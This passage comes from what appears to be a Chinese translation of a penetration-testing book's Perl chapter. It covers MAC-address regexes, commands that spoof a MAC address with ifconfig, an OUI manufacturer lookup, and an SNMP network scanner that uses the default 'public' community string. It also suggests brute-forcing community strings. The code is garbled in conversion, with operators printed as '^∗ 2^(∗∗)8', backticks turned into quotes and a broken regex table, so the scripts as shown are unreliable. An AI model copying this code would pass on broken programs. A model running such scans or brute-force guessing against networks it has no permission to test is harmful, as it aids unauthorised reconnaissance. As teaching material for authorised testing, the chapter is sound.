  \ MAC 地址或 IP 地址，或者可能需要为完全不同的模式构建一个，例如序列号或其他相对独特的模式。\n\n> **注意**  \n> 在大多数我们可能使用的脚本和编程语言中，我们都可以找到正则表达式或其功能等效物。尽管不同语言处理正则表达式的方式可能存在一些语法差异，但正则表达式的基础知识往往保持不变。\n\
  \n让我们获取一些在使用正则表达式时可供处理的信息。在渗透测试过程中，我们可能感兴趣的一个信息是 MAC 地址。MAC 地址可以（相对）唯一地标识给定设备上的网络接口，并可能为我们提供有关设备制造商和型号的信息。\n\
  \n> **警告**  \n> 在大多数操作系统上，更改与网络接口关联的 MAC 地址是可能的，而且通常很简单。在大多数 Linux 操作系统上，我们可以使用类似以下的\
  \ `ifconfig` 命令来更改 MAC 地址：\n> \n> ```\n> ifconfig eth0 down\n> ifconfig eth0 hw\
  \ ether DE:AD:BE:EF:CA:FE\n> ifconfig eth0 up\n> ```\n> \n> 我们应该意识到，在渗透测试中看到的 MAC\
  \ 信息可能已被更改。\n\n我们可以在 Linux 下使用 `ifconfig` 命令查看 MAC 信息。只需在命令提示符下输入 `ifconfig`，就会输出大量信息，包括第一行中\
  \ `HWaddr` 后面的 MAC 地址，如图 3.6 所示。\n\n![image](img/F000035f03-06-9781597497299.jpg)\n\
  \n图 3.6 ifconfig 输出\n\n虽然我们可以通过运行 `ifconfig | grep HWaddr` 来简单地 grep 出 MAC 地址以及整个第一行输出，但我们也可以使用正则表达式来检索输出中匹配\
  \ MAC 地址模式的项。\n\n```\n#!/usr/bin/perl\n\n$text = ’ifconfig | grep HWaddr’;\n\nprint\
  \ \"the string is \",$text,\"\\n\";\n\n$text =~ m/((?:[0-9a-f]{2}[:-]){5}[0-9a-f]{2})/i;\n\
  \nprint \"the mac is \",$&,\"\\n\"; #$& 是上一次成功匹配的内容\n```\n\n\n\n\n那么，这里我们有标准的 shebang，以及我们的\
  \ `ifconfig` 行，用于从网络信息中获取包含 MAC 地址的文本行，并将其放入 `$text` 中。由于我们通过 `grep` 管道传递了 `ifconfig`\
  \ 的输出，因此我们不必处理 `ifconfig` 返回的其他行，并且我们可以使用相同的方法将结果缩小到其他项目，例如 IP 地址。我们将打印出 `$text`\
  \ 中的字符串，以便确切地看到我们将要匹配的内容，然后继续使用我们的正则表达式。\n\n对于不熟悉正则表达式的人来说，这一行：`$text =~ m/(([0-9a-f]{2}[:-]){5}[0-9a-f]{2})/i;`\
  \ 可能看起来有点令人困惑，并且很大程度上像随机的乱码字符。第一个正斜杠 `/` 之前的 `m` 是匹配运算符。两个正斜杠之间的字符实际上是我们用来查找存储在\
  \ `$text` 中的行中 MAC 地址的模式。在模式中，我们有两个主要部分；第一部分处理 MAC 地址的前五个字节，第二部分处理最后一个字节。\n\n第一部分\
  \ `([0-9a-f]{2}[:-]){5}` 表示查找一个模式，该模式以两个在 0–9 或 a–f 范围内的字符开头，后跟一个冒号 `:` 或短横线 `-`，并查找此模式的五次重复，对应\
  \ MAC 地址的前五个字节。MAC 地址的第六个字节不以冒号结尾，因此我们需要稍微更改模式。对于第六个字节，我们匹配 `[0-9a-f]{2}`，表示两个在\
  \ 0–9 或 a–f 范围内的字符。\n\n我们将整个模式集用括号 `()` 括起来，并添加 `/i` 以使我们的模式不区分大小写。这不是一个完全完美的正则表达式，但在绝大多数情况下它会正确匹配。我们可能会遇到一个边界情况，例如有一个混合了冒号和短横线的类似模式，并意外匹配到它，但对于我们将这种脚本用于的大多数应用程序来说，这很可能是一个边界情况。\n\
  \n我们脚本的最后一行 `print \"the mac is \",$&,\"\\n\";` 打印出我们使用正则表达式找到的 MAC 地址。这一行相对清晰，除了使用了一个特殊变量\
  \ `$&`，该变量将包含我们脚本中最近一次模式匹配中找到的字符串，即我们的 MAC 地址。\n\n在我们的正则表达式中，还有许多其他用于匹配模式的字符指示符。表\
  \ 3.2 列出了其中一些。\n\n表 3.2 正则表达式模式字符\n\n| 字符 | 行为 |\n| --- | --- |\n| `\\d` | 数字字符\
  \ |\n| `\\D` | 非数字字符 |\n| `\\e` | 转义符 |\n| `\\n` | 换行符 |\n| `\\r` | 回车符 |\n| `\\\
  s` | 任何空白字符 |\n| `\\S` | 任何非空白字符 |\n| `\\t` | 制表符 |\n| `^∗` | 匹配 0 次或多次 |\n| `.`\
  \ | 任何字符 |\n| `+` | 匹配 1 次或多次 |\n| `?` | 匹配 1 次或 0 次 |\n| `{n}` | 匹配 *n* 次 |\n|\
  \ `{n,}` | 匹配至少 *n* 次 |\n| `{n,m)` | 匹配至少 *n* 次，但不超过 *m* 次 |\n\n我们还可以使用许多在线正则表达式工具（例如在\
  \ [`regextester.com`](http://regextester.com) 上找到的工具）来测试我们的正则表达式，并将其与代码分开调整。\n\n\
  ### 文件输入和输出\n\n我们可以使用我们用来匹配 MAC 地址的脚本，并在此基础上添加一些额外的功能，使其更有用。我们可能希望在脚本中执行的一个常见任务是从文件中获取输出或将输出发送到文件。Perl\
  \ 中的文件输入和输出非常简单。为了打开一个文件进行输出，我们只需要一个文件句柄的名称和一个文件名。我们可以使用几种不同的选项以不同的方式打开文件：\n\n```\n\
  open (FILE, \">logfile.log\"); #写入\nopen (MONKEY, \">>somefile\"); #追加\nopen (INPUT,\
  \ \"<datafile.dat\"); #读取\nopen (MYFILE, \"file.txt\"); #读取\n```\n\n使用 `>` 符号打开文件进行写入，`>>`\
  \ 打开文件进行写入，但如果文件已存在，则会追加新内容而不是覆盖文件，`<` 打开文件进行读取，而不使用任何指示符也会打开文件进行读取。关闭已打开的文件也非常简单；我们只需使用\
  \ `close` 和文件句柄，例如 `close (MYFILE);`。让我们使用文件访问，并调整我们的 MAC 脚本使其更有用。\n\n```\n#!/usr/bin/perl\n\
  \n#从 IEEE 获取 OUI 数据库\n\n’wget -N http://standards.ieee.org/develop/regauth/oui/oui.txt\
  \ 2>/dev/null’;\n\nopen (LOG, \">>maclog.log\") || die \"无法以追加模式打开 maclog.log $!\\\
  n\";\n\n$netinfo = ’ifconfig | grep HWaddr’;\n\nprint \"网络信息是 \",$netinfo,\"\\n\"\
  ;\n\nprint LOG \"网络信息是 \",$netinfo,\"\\n\";\n\n$netinfo =~ m/(([0-9a-f]{2}[:-]){5}[0-9a-f]{2})/i;\n\
  \n$mac = $&; #$& 是上一次成功匹配的结果\n\nprint \"MAC 地址是 \",$mac,\"\\n\";\n\nprint LOG \"\
  MAC 地址是 \",$mac,\"\\n\";\n\n@macparts = split /:/, $mac;\n\n@ouiparts = splice(@macparts,0,3);\n\
  \n$oui = join(’’,@ouiparts);\n\nprint \"OUI 是 \",$oui,\"\\n\";\n\nprint LOG \"OUI\
  \ 是 \",$oui,\"\\n\";\n\nopen (OUIDB,\"oui.txt\") || die \"无法打开 oui.txt $!\\n\";\n\
  \nwhile (<OUIDB>){\n\n   $line = $_; #$_ 是隐式标量变量\n\n   print \"行是\", $line,\"oui\
  \ 是 \",$oui,\"\\n\";\n\n   if($line =~ /$oui/i){\n\n     @ouientry = $line;\n\n\
  \     last;\n\n   }else{\n\n     @ouientry[0] = \"未找到制造商\";\n\n   }\n\n}\n\nclose\
  \ (OUIDB) or die \"无法关闭 oui.txt $1\\n\";\n\n@ouientryfields = split(/\\t/,@ouientry[0]);\n\
  \nprint \"制造商是 \",@ouientryfields[2],\"\\n\";\n\nprint LOG \"制造商是 \",@ouientryfields[2],\"\
  \\n\";\n\nprint LOG \"^(∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗)\\n\";\n\nclose\
  \ (LOG) or die \"无法关闭 maclog.log $1\\n\";\n```\n\n警告\n\n我们故意在这个脚本中留下了一个逻辑错误。脚本会运行，但在某些条件下无法正确运行。这是一个练习调试技能的绝佳机会。\n\
  \n我们运行脚本 `./checkmac2.pl`。第一次运行脚本时，由于下载 OUI 文件，我们可能会看到轻微的延迟。然后我们应该看到类似于图 3.7 所示的输出。\n\
  \n![image](img/F000035f03-07-9781597497299.jpg)\n\n图 3.7 Checkmac 输出\n\n那么，让我们逐步分析脚本，看看我们到底在做什么。顶部有标准的\
  \ shebang，然后我们运行 `wget` 以从电气和电子工程师协会（IEEE）网站检索 `oui.txt`。请注意，仅对于 `wget` 命令，我们通过使用\
  \ `2>/dev/null` 将命令的输出重定向到 `/dev/null`，从而有效地阻止 `wget` 的输出显示到控制台。`oui.txt` 文件是一个平面文件，它将构成\
  \ MAC 地址前三个字节的组织唯一标识符（OUI）映射到与之关联的公司。OUI 是与特定公司关联的一个或多个标识符，并且由该公司生产的设备或软件（在虚拟化网络硬件的情况下）关联的所有\
  \ MAC 地址都将携带该公司的 OUI。\n\n一旦我们有了文件，我们以追加模式打开一个新文件 `maclog.log`，这样我们就可以在脚本后面写出我们的结果。如果我们无法打开文件，我们还会发出错误消息，包括存储在\
  \ `$!` 中的确切错误，并退出脚本。\n\n然后，我们像之前一样从 `ifconfig` 获取信息，并将信息回显到控制台和日志文件。我们还使用相同的正则表达式来匹配\
  \ MAC 地址模式，将 MAC 地址放入 `$mac` 中。现在我们有了 MAC 地址，我们需要将其拆分为各个字节，以便分离出 OUI（前三个字节）。我们使用\
  \ `split` 命令来执行此操作，告诉 `split` 使用冒号作为分隔符，并将结果放入数组 `@macparts` 中。\n\n\n\n然后，我们取 `@macparts`\
  \ 的前三个元素，即 OUI，并使用 `splice` 将它们提取出来放入 `@ouiparts`。`splice` 命令接受数组 `@macparts`、起始点（元素\
  \ 0）和长度（3）作为参数，从而精确提取我们需要的元素。之后，我们将这些元素重新连接起来，中间不插入任何字符，并放入变量 `$oui` 中。这就是我们在 `oui.txt`\
  \ 中查找 OUI 所需的格式。\n\n现在，我们可以打开 `oui.txt`，并解析其中的内容以找到我们的 OUI。这里我们使用不带参数的 `open`，因此默认以读取方式打开，并使用\
  \ `OUIDB` 作为文件句柄。\n\n文件打开后，我们使用一个带有文件句柄的 `while` 循环，只要文件中还有未解析的行，循环就会继续。我们使用 `$_`（与文件中当前行关联的隐含变量）将该行传入变量\
  \ `$line`。然后，我们用一个简单的 `if` 语句检查 `$line` 中的值是否与 `$oui` 中的值匹配，从而表明我们找到了所需的目标。如果行匹配，我们将其放入数组\
  \ `@ouientry`，并执行 `last` 以退出 `while` 循环。如果行不匹配，我们将未找到的字符串放入 `@ouientry` 的第一个元素。当遍历完整个\
  \ `oui.txt` 文件后，我们使用 `close` 关闭它。\n\n现在，我们已经从 `oui.txt` 中获取了所需的行，并将数据保存在 `@ouientry`\
  \ 中，接下来可以将其拆分以获取所需的部分。我们再次使用 `split`，这次按字段之间的制表符 `/t` 进行拆分，并将结果放入 `@ouientryfields`，其中我们需要的字段（公司名称）位于元素\
  \ 2。然后，我们将这些信息输出到控制台和日志文件，并关闭文件。呼，工作量真不小。\n\n## 整合所有内容\n\n在本章中，我们学习了 Perl 的许多不同知识点，并且从已编写的脚本中获得了几个有趣的起点，现在让我们用它们来构建一些实用的东西。\n\
  \n### 使用 Perl 构建 SNMP 扫描器\n\nSNMP 是一种可用于监控和管理网络中大量设备的协议。SNMP 可用于从设备收集信息并对设备进行更改，并且广泛支持各种硬件和软件设备。\n\
  \n给定设备是否响应 SNMP 请求取决于其配置方式，或者可能需要某种身份验证才能与其通信。较新的软件和设备往往配置得更安全（就 SNMP 而言），默认情况下可能根本不响应此类查询。对于面向\
  \ SNMP 的工具来说，网络打印机通常是一个很好的测试目标，因为它们在网络上非常“健谈”，并且往往配置得非常不安全。\n\n```perl\n#!/usr/bin/perl\n\
  \nuse Net::Ping;\n\nuse Net::SNMP;\n\n@log; #array that holds the log\n\n$time =\
  \ localtime;\n\npush (@log,\"\\n\\n###### $time ######\\n\\n\");\n\n#variables for\
  \ ping\n\n$ip1 = @ARGV[0];\n\n$ip2 = @ARGV[1];\n\n$rawip1 = get_raw_address($ip1);\n\
  \n$rawip2 = get_raw_address($ip2);\n\n#variables for SNMP\n\n$mibName = \"1.3.6.1.2.1.1.5.0\"\
  ; # System Name\n\n$mibDescr = \"1.3.6.1.2.1.1.1.0\"; # System Description\n\n$mibHardwareType\
  \ = \"1.3.6.1.2.1.25.3.2.1.2.1\"; # hardware type\n\n$port = 161;\n\n$community\
  \ = \"public\";\n\n$retries = 1;\n\n#main loop\n\nfor ($counter = $rawip1;$counter<=\
  \ $rawip2;$counter++){\n\n   $host = get_ip_address($counter);\n\n   $pinger = Net::Ping->new(\"\
  icmp\", 1, 64);\n\n   if ($pinger->ping($host)) {\n\n     print \"\\n$host is up\\\
  n\";\n\n     push (@log,\"\\n$host is up\");\n\n     &init_snmp;\n\n     &get_snmp_info;\n\
  \n     $session->close;\n\n     &write_log;\n\n   } else {\n\n     print \"\\n$host\
  \ is down\\n\";\n\n     push (@log,\"\\n$host is down\");\n\n     &write_log;\n\n\
  \   }\n\n}\n\n###### get_raw_address ######\n\n#get the raw version of an IP\n\n\
  sub get_raw_address {\n\n   my $ipaddress;\n\n   my $oct1;\n\n   my $oct2;\n\n \
  \  my $oct3;\n\n   my $oct4;\n\n   my $retval;\n\n   $ipaddress = shift;\n\n   ($oct1,\
  \ $oct2, $oct3, $oct4) = split /\\./, $ipaddress;\n\n   $retval = $oct4 + ($oct3\
  \ ^∗ 2^(∗∗)8) + ($oct2 ^∗ 2^(∗∗)16) + ($oct1 ^∗ 2^(∗∗)24);\n\n   return $retval;\n\
  \n}\n\n###### get_ip_address ########\n\n#get the regular version of an IP\n\nsub\
  \ get_ip_address {\n\n   my $rawaddress;\n\n   my $retval;\n\n   my $oct;\n\n  \
  \ my $counter;\n\n   $rawaddress = shift;\n\n   while ($counter<4){\n\n     $oct\
  \ = $rawaddress % 2^(∗∗)8; #get the rightmost 8 bits\n\n     $retval = $oct . \"\
  .\" . $retval;\n\n     $rawaddress = int($rawaddress / 2^(∗∗)8); #get the next 8\
  \ bits\n\n     $counter++;\n\n   }\n\n   chop $retval;\n\n   if ($retval =~ m/\\\
  .(255 | 0)$/) { # skip 0 & 255 addresses\n\n     return 0;\n\n   }\n\n   return\
  \ $retval;\n\n}\n\n###### init_snmp ######\n\n#set up an SNMP session\n\nsub init_snmp\
  \ {\n\n   ($session, $error) = Net::SNMP->session(\n\n   Hostname => $host,\n\n\
  \   Community => $community,\n\n   Port => $port,\n\n   Retries => $retries\n\n\
  \   );\n\n   if(!defined($session)){\n\n     die \"Couldn’t setup SNMP session\\\
  n\\n\"\n\n   }\n\n   $session->timeout($timeout);\n\n}\n\n###### get_snmp_info ######\n\
  \n#retrieve our specified information\n\nsub get_snmp_info{\n\n$name = &get_request($mibName);\n\
  \nif ($name =~ /no response/){\n\n   print \"no SNMP response from \",$host,\"\\\
  n\";\n\n   return;\n\n}\n\nprint \"name = \",$name,\"\\n\";\n\npush (@log,\"name\
  \ = $name\");\n\n$description = &get_request($mibDescr);\n\nprint \"description\
  \ = \",$description,\"\\n\";\n\npush (@log,\"description = $description\");\n\n\
  $hardware = &get_request($mibHardwareType);\n\nif ($hardware =~ /1.3.6.1.2.1.25.3.1.5/){\n\
  \n   $hardware = \"Printer\";\n\n}\n\nif ($hardware =~ /1.3.6.1.2.1.25.3.1.3/){\n\
  \n   $hardware = \"Processor\";\n\n}\n\nif ($hardware =~ /1.3.6.1.2.1.25.3.1.4/){\n\
  \n   $hardware = \"Network\";\n\n}\n\nif ($hardware =~ /1.3.6.1.2.1.25.3.1.6/){\n\
  \n   $hardware = \"Disk Storage\";\n\n}\n\nif ($hardware =~ //){\n\n   $hardware\
  \ = \"Unknown\";\n\n}\n\nprint \"hardware = \",$hardware,\"\\n\";\n\npush (@log,\"\
  hardware = $hardware\");\n\n}\n\n###### get_request ######\n\n#grab a specific MIB\n\
  \nsub get_request {\n\n   # Takes only one MIB as an argument!\n\n   my $response;\n\
  \n   my $return;\n\n   if(!defined($response = $session->get_request($_[0]))) {\n\
  \n     return \"no response\";\n\n   }\n\n   $return = $response->{$_[0]};\n\n \
  \  return $return;\n\n}\n\n###### write log ######\n\n#write out all the log entries\
  \ in @log\n\nsub write_log{\n\n   open (LOG, \">>snmp.log\") || print \"Error Opening\
  \ snmplog.log: $!\\n\";\n\n   print LOG join(\"\\n\",@log), \"\\n\";\n\n   close(LOG)\
  \ or die \"Error Closing snmplog.log : $!\\n\";\n\n   @log = (); #clear the log\
  \ array\n\n}\n```\n\n我们可以使用 `./snmp.pl 10.0.0.50 10.0.0.55` 来执行 SNMP 扫描脚本。这应该会产生类似于图\
  \ 3.8 的结果，当然，返回的具体信息取决于我们运行脚本的网络以及扫描设备的配置。为了从 SNMP 获取良好的数据，我们很可能需要在目标设备上启用它，就像较新版本的类\
  \ Unix 和 Microsoft 操作系统那样。\n\n![image](img/F000035f03-08-9781597497299.jpg)\n\n\
  图 3.8 SNMP 扫描器输出\n\n让我们逐步分析这个脚本。脚本的一部分与我们之前编写的 ping 扫描器相同，因此我们将略过未更改的部分。\n\n在脚本顶部，我们可以看到\
  \ shebang 以及之前使用的 `Net::Ping` 模块。我们还添加了一条语句来使用 `Net::SNMP` 模块，该模块将允许我们建立 SNMP 连接并检索所需的信息。\n\
  \n\n\n我们还添加了一种与 MAC 脚本中使用的日志记录机制略有不同的方式。之前，我们打开日志文件并保持打开状态，在整个脚本中向其中打印内容。现在，我们将日志条目存储在数组\
  \ `@log` 中，并且只在真正需要转储日志内容时才打开文件，然后立即关闭。这样我们就不需要在脚本执行的整个过程中保持日志文件打开——如果扫描的 IP 范围很大，这可能会持续很长时间。我们通过使用\
  \ `push` 将条目放入日志数组，如代码行 `push (@log,\"\\n\\n###### $time ######\\n\\n\");` 所示。使用\
  \ `push` 时，我们将数组视为栈，将新条目添加到其末尾，并每次增加与添加条目数量相同的长度。在写入日志文件时，这将使我们能够按正确顺序访问数组以写入条目。\n\
  \n除此之外，我们还可以看到两个变量部分。用于 ping 的部分与我们在 MAC 脚本中使用的相同，但 SNMP 部分完全是新的。这里有三个变量：`$mibName`、`$mibDescr`\
  \ 和 `$mibHardwareType`，我们将分别用它们从目标设备获取主机名、描述和硬件类型。管理信息库（MIB）是一个包含设备信息的数据库，我们将通过\
  \ SNMP 连接到该设备。大多数设备都有一个通用 MIB，其中包含我们在这里寻找的信息，以及许多其他特定于硬件类型或特定制造商的 MIB。我们放入这三个变量的值是我们正在寻找的信息在\
  \ MIB 中的地址。要查找其他信息，我们需要正确的 MIB，可以在任何在线资源（例如 [www.midepot.com](http://www.midepot.com)）或设备或软件的文档中查找。\n\
  \n在 SNMP 变量部分，我们还可以看到 `$port`、`$community` 和 `$retries` 变量。这些变量指定了我们将用于 SNMP 流量的端口、团体名以及如果\
  \ SNMP 连接失败时的重试次数。需要团体名才能通过 SNMP 连接到设备，大多数设备的默认团体名设置为 `public`。\n\n在此之后，我们可以看到脚本的主循环。这里的结构与我们在\
  \ MAC 脚本中使用的 `for` 循环完全相同，我们可以通用地将其用于任何遍历一组 IP 并对每个 IP 执行操作的任务。唯一的区别是添加了几行代码来将信息推送到日志文件，并调用我们的\
  \ SNMP 函数以及将日志数组写入文件的函数。\n\n在 `init_snmp` 函数中，我们简单地设置到目标设备（由 `$host` 指定）的 SNMP 连接。我们还使用了在脚本顶部指定的其他\
  \ SNMP 相关变量。我们调用 `Net::SNMP` 来建立新会话，并将变量传递给它，以便为其提供会话参数。然后我们检查会话是否实际已定义。如果没有，则退出并显示错误。此外，我们还设置了\
  \ SNMP 会话的超时时间。\n\n回到主循环，我们调用 `get_snmp_info` 来通过 SNMP 获取我们想要的特定信息。在 `get_snmp_info`\
  \ 中，我们利用脚本开头定义的 MIB 发出多个请求。我们首先尝试获取主机名并将其存储在 `$name` 中，使用 `get_request` 函数，该函数通过\
  \ SNMP 发出请求并返回结果。如果在发出请求后我们在 `$name` 中发现了文本 `no response`，这意味着我们没有收到设备的回复，即使我们成功建立了\
  \ SNMP 连接。如果是这种情况，我们不太可能在此函数的其余部分中获取任何其他信息，因此最好在此处退出，而不是等待其他请求失败。我们可以使用 `return`\
  \ 退出函数。\n\n如果我们在 `$name` 中确实得到了一个值，我们将打印它，将其推送到日志数组，然后继续获取下一个项目——设备描述。返回的字符串会因目标设备的不同而有很大差异。获取描述后，我们将检索设备的硬件类型。在\
  \ `$hardware` 中返回的字符串实际上是一个 MIB 地址，需要一些转换。根据返回的内容，我们将用指示我们识别出的硬件类型的文本字符串替换 MIB 地址。完全有可能遇到我们尚未考虑到的硬件类型，需要修改代码才能正确识别。打印并记录硬件类型后，我们将返回主循环。\n\
  \n在这里，我们关闭 SNMP 会话，因为本轮循环中已经完成了对它的使用。然后我们调用 `write_log`。在 `write_log` 中，我们打开日志文件\
  \ `snmp.log`，然后处理日志数组。我们对数组的所有元素执行 `join`，使用 `\\n` 作为分隔符，以便每个条目之间有一个换行符。然后我们关闭文件并清空\
  \ `@log` 数组。由于我们在主循环的每一轮中都重复使用 `@log`，如果每次写入后不清空数组，几轮之后数组会变得非常大。\n\n### 改进脚本\n\n\
  我们可以通过多种方式改进 SNMP 脚本。以下是一些比较明显的改进点：\n\n- 我们可能可以通过 SNMP 收集更多的信息。根据具体设备及其配置方式，我们可能能够收集各种软件和硬件信息，包括序列号、账户、硬件规格等。\n\
  - 目前我们将默认团体名硬编码为 `public`。虽然这是许多设备使用的标准团体名，但我们可以轻松地将其作为参数传入，或者从文件中的常用名称列表中读取。\n\
  - 我们还可以尝试使用字典文件或暴力破解技术来猜测团体名。\n- 在输出日志文件时，我们可能希望采用更标准化的格式，以便人员或其他工具轻松解析。我们可以通过将日志格式化为逗号分隔值（CSV）文件来实现这一点，这将大大有助于实现这一目标。\n\
  - 我们还可能希望分离日志信息，以便为通过 SNMP 返回信息的在线设备单独创建一个日志。这很容易实现，只需创建另一个日志并添加一些条件语句，将感兴趣的结果分类到正确的日志中。\n\
  \n## 总结\n\nPerl 作为一种脚本语言，在许多情况下都很有用。这体现在其最初的设计目的——作为处理文本和报告的工具，也体现在其将不同应用程序粘合在一起的能力上。我们可以使用\
  \ Perl 处理数据并将来自不同来源的数据合并在一起，这在渗透测试领域（拥有众多工具）是一种常见功能。\n\nPerl 发行版可用于多种平台，从 [perl.org](http://perl.org)\
  \ 提供的标准 Perl，到具有额外功能并附带各种实用程序和工具（例如 ActiveState 提供的版本）的特定版本。通常，同一主版本内的发行版相对兼容，我们可以将\
  \ Perl 代码从一个版本迁移到另一个版本，而无需进行重大重写。Perl 代码可以在多种工具中开发，从简单的编辑器到专门的集成开发环境（IDE）。我们还可以利用其他功能，例如为脚本创建图形界面，并通过使用一些实用程序将其编译为可执行的二进制格式。\n\
  \n\n\nPerl 脚本遵循我们在其他脚本或编程语言中能找到的大多数标准约定。我们可以使用各种数据结构，如变量和数组，在脚本中存储数据。我们可以通过使用反引号在\
  \ shell 中执行命令，这与我们在 shell 脚本中使用`bash` shell 的方式非常相似。我们可以使用参数、控制语句（如循环和条件语句），以及正则表达式、文件\
  \ I/O 和许多其他标准编程语言特性。\n\n## 尾注\n\n1. Allen J. Perl 5 版本 12.2 文档。*perldoc.perl.org.*\
